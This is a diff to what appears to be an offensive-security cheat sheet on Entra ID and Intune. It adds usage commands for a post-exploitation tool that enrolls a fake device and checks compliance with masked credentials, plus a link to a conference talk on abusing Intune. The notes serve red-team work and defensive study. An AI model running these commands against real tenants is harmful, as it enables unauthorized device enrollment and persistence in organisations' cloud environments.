@@ -180,7 +180,19 @@ PS> dsregcmd.exe /status
 
 ### Join Devices
 
-* [Enroll Windows 10/11 devices in Intune](https://learn.microsoft.com/en-us/mem/intune/user-help/enroll-windows-10-device)
+[Enroll Windows 10/11 devices in Intune](https://learn.microsoft.com/en-us/mem/intune/user-help/enroll-windows-10-device)
+
+* [secureworks/pytune](https://github.com/secureworks/pytune) - Pytune is a post-exploitation tool for enrolling a fake device into Intune with mulitple platform support.
+    ```ps1
+    usage: pytune.py [-h] {entra_join,entra_delete,enroll_intune,checkin,retire_intune,check_compliant,download_apps} ...
+
+    python3 pytune.py entra_join -o Windows -d Windows_pytune -u testuser@*******.onmicrosoft.com -p ***********
+    python3 pytune.py enroll_intune -o Windows -d Windows_pytune -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p ***********
+    python3 pytune.py checkin -o Windows -d Windows_pytune -c Windows_pytune.pfx -m Windows_pytune_mdm.pfx -u testuser@*******.onmicrosoft.com -p ***********
+    python3 pytune.py check_compliant -o Windows -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p ***********
+    python3 pytune.py check_compliant -o Windows -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p *********** -H $HWHASH
+    ```
+
 
 
 ### Register Devices
@@ -248,3 +260,4 @@ roadtx findscope -s https://graph.microsoft.com/mail.read
 * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
 * [Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence - Katie Knowles - September 16, 2024](https://securitylabs.datadoghq.com/articles/abusing-entra-id-administrative-units/)
 * [Create Sticky Backdoor User Through Restricted Management AU - Datadog, Inc](https://stratus-red-team.cloud/attack-techniques/entra-id/entra-id.persistence.restricted-au/)
+* [Unveiling the Power of Intune: Leveraging Intune for Breaking Into Your Cloud and On-Premise - Yuya Chudo - December 11, 2024](https://i.blackhat.com/EU-24/Presentations/EU-24-Chudo-Unveiling-the-Power-of-Intune-Leveraging-Intune-for-Breaking-Into-Your-Cloud-and-On-Premise.pdf)
